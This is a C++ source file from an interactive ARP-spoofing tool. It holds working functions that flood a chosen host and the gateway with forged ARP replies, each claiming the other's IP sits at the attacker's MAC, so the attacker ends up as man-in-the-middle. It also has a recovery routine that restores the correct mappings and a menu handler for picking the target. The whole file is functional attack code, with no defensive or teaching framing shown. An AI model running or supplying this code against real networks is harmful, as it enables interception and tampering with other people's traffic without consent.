#include "common.hpp"

// --- Core MITM Attack & Recovery Functions ---

void mitm_attack(const Host target, const Host gateway, std::atomic<bool>* signal) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("MITM Attack socket");
        return;
    }

    unsigned char attacker_mac_bytes[6];
    string_mac_to_bytes(attacker_mac_bytes, active_interface.mac);

    unsigned char target_mac_bytes[6];
    string_mac_to_bytes(target_mac_bytes, target.mac);
    unsigned char target_ip_bytes[4];
    inet_pton(AF_INET, target.ip.c_str(), target_ip_bytes);

    unsigned char gateway_mac_bytes[6];
    string_mac_to_bytes(gateway_mac_bytes, gateway.mac);
    unsigned char gateway_ip_bytes[4];
    inet_pton(AF_INET, gateway.ip.c_str(), gateway_ip_bytes);

    unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct arp_header)];
    struct sockaddr_ll sll = {0};
    sll.sll_ifindex = active_interface.index;
    struct ethhdr* eth = (struct ethhdr*)buffer;
    struct arp_header* arp = (struct arp_header*)(buffer + sizeof(struct ethhdr));
    *arp = {htons(ARPHRD_ETHER), htons(ETH_P_IP), 6, 4, htons(ARPOP_REPLY)};

    while (signal->load()) {
        // Tell Target that Gateway is at Attacker's MAC
        memcpy(eth->h_source, attacker_mac_bytes, 6);
        memcpy(eth->h_dest, target_mac_bytes, 6);
        eth->h_proto = htons(ETH_P_ARP);
        memcpy(arp->sender_mac, attacker_mac_bytes, 6);
        memcpy(arp->sender_ip, gateway_ip_bytes, 4);
        memcpy(arp->target_mac, target_mac_bytes, 6);
        memcpy(arp->target_ip, target_ip_bytes, 4);
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));

        // Tell Gateway that Target is at Attacker's MAC
        memcpy(eth->h_dest, gateway_mac_bytes, 6);
        memcpy(arp->sender_ip, target_ip_bytes, 4);
        memcpy(arp->target_mac, gateway_mac_bytes, 6);
        memcpy(arp->target_ip, gateway_ip_bytes, 4);
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));

        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    close(sock);
}

void recover_mitm(const Host& target, const Host& gateway) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("MITM Recovery socket");
        return;
    }

    unsigned char target_mac_bytes[6];
    string_mac_to_bytes(target_mac_bytes, target.mac);
    unsigned char target_ip_bytes[4];
    inet_pton(AF_INET, target.ip.c_str(), target_ip_bytes);

    unsigned char gateway_mac_bytes[6];
    string_mac_to_bytes(gateway_mac_bytes, gateway.mac);
    unsigned char gateway_ip_bytes[4];
    inet_pton(AF_INET, gateway.ip.c_str(), gateway_ip_bytes);

    unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct arp_header)];
    struct sockaddr_ll sll = {0};
    sll.sll_ifindex = active_interface.index;
    struct ethhdr* eth = (struct ethhdr*)buffer;
    struct arp_header* arp = (struct arp_header*)(buffer + sizeof(struct ethhdr));
    *arp = {htons(ARPHRD_ETHER), htons(ETH_P_IP), 6, 4, htons(ARPOP_REPLY)};

    for (int i = 0; i < 3; ++i) {
        // Tell Target the correct MAC for Gateway
        memcpy(eth->h_source, gateway_mac_bytes, 6);
        memcpy(eth->h_dest, target_mac_bytes, 6);
        eth->h_proto = htons(ETH_P_ARP);
        memcpy(arp->sender_mac, gateway_mac_bytes, 6);
        memcpy(arp->sender_ip, gateway_ip_bytes, 4);
        memcpy(arp->target_mac, target_mac_bytes, 6);
        memcpy(arp->target_ip, target_ip_bytes, 4);
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));

        // Tell Gateway the correct MAC for Target
        memcpy(eth->h_source, target_mac_bytes, 6);
        memcpy(eth->h_dest, gateway_mac_bytes, 6);
        memcpy(arp->sender_mac, target_mac_bytes, 6);
        memcpy(arp->sender_ip, target_ip_bytes, 4);
        memcpy(arp->target_mac, gateway_mac_bytes, 6);
        memcpy(arp->target_ip, gateway_ip_bytes, 4);
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));

        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    close(sock);
}

void start_mitm_attack() {
    if (hosts.empty()) {
        std::cout << RED << "\nNo targets found. Please scan the network first (Option 1)." << RESET << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return;
    }

    display_scan_results();
    std::cout << "\nEnter a single target ID to attack.\n";
    std::cout << "Enter 'back' to return to the main menu.\n";
    std::cout << "\nTarget ID: ";

    std::string input;
    std::getline(std::cin, input);
    if (input == "back") return;

    int target_id = -1;
    try {
        target_id = std::stoi(input);
    } catch (...) {
        std::cout << YELLOW << "Invalid input." << RESET << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return;
    }

    if (target_id <= 0 || static_cast<size_t>(target_id) > hosts.size()) {
        std::cout << YELLOW << "No valid target selected." << RESET << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return;
    }

    Host target_to_attack = hosts[target_id - 1];

    std::string gateway_ip_str;
    FILE *fp = popen("ip r | grep default | cut -d' ' -f3", "r");
    char buf[16];
    if (fp && fgets(buf, sizeof(buf), fp) != NULL) gateway_ip_str = buf;
    if(fp) pclose(fp);
    gateway_ip_str.erase(std::remove(gateway_ip_str.begin(), gateway_ip_str.end(), '\n'), gateway_ip_str.end());

    Host gateway_host;
    gateway_host.ip = gateway_ip_str;
    // Find gateway MAC from scanned hosts
    for (const auto& host : hosts) {
        if (host.ip == gateway_ip_str) {
            gateway_host.mac = host.mac;
            break;
        }
    }
    if (gateway_host.mac.empty()) {
        std::cout << YELLOW << "Gateway not found in scan results. Please scan again." << RESET << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return;
    }


    std::atomic<bool> attack_signal(true);
    std::thread attack_thread(mitm_attack, target_to_attack, gateway_host, &attack_signal);

    print_header();
    std::cout << BOLD << RED << "[ATTACKING] " << target_to_attack.ip << "..." << RESET << std::endl;
    std::cout << BOLD << YELLOW << "\nAttack is running. Press 's' and Enter to stop." << RESET << std::endl;

    char stop_char;
    do { std::cin >> stop_char; } while (stop_char != 's' && stop_char != 'S');

    attack_signal.store(false);
    std::cout << "\n" << BOLD << YELLOW << "[!] Stopping attack thread..." << RESET << std::endl;
    if (attack_thread.joinable()) { attack_thread.join(); }

    std::cout << BOLD << GREEN << "[+] Sending recovery packets..." << RESET << std::endl;
    recover_mitm(target_to_attack, gateway_host);
    std::cout << "[+] Network should be restored." << RESET << std::endl;
    std::cout << "\nPress Enter to continue...";
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin.get();
}